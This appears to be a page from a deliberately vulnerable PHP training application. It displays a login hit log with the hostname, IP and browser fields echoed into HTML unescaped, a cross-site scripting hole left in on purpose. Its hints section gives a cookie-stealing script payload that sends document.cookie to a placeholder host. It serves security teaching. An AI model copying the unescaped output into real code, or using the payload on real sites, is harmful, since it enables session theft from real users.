<center><h2><b>User Login Attempts and Registrations</b></h2></center><p>
<?php
$query = "SELECT * FROM `hitlog`";
$result = $mysqli->query($query) or die($mysqli->error . '<p><b>SQL Statement:</b>' . $query);;
//echo $result;
echo '<TABLE border="1" width="100%">';
   echo "<TR><TD><B>Hostname</B></font></TD><TD><B>IP</B></TD><TD><B>Browser Agent</B></TD><TD><B>Action Taken</B></TD><TD><B>Date/Time</B></TD></TR>";
while($row = $result->fetch_assoc())
{
echo "<TR><TD>{$row['hostname']}</TD><TD>{$row['ip']}</TD><TD>{$row['browser']}</TD><TD>{$row['action']}</TD><TD>{$row['date']}</TD></TR>\n";
}
echo "</TABLE>";

//phpinfo();
?>
<?php
// Begin hints section
if (@$_COOKIE["showhints"]==1) {
	echo '<p><div style="background-color: #FFFF00"></p> <p><center><h2><b>HINT - Disable with link on the left</b></h2></center></p>
	<b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
	instantly) and stored (someone can run across it later in another app that
	uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
	there are far more interesting things you could do which I plan show in a video later. 
	For some hot cookie stealing action, try something like:
	<pre>
	&lt;script&gt;
		new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
	&lt;/script&gt;
	</pre>	
	Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheat Sheet</a>
	for more ways you can encode XSS attacks that may allow you to get around some filters.
	<br><br>
	</div>'; 
}
// End hints section
?>
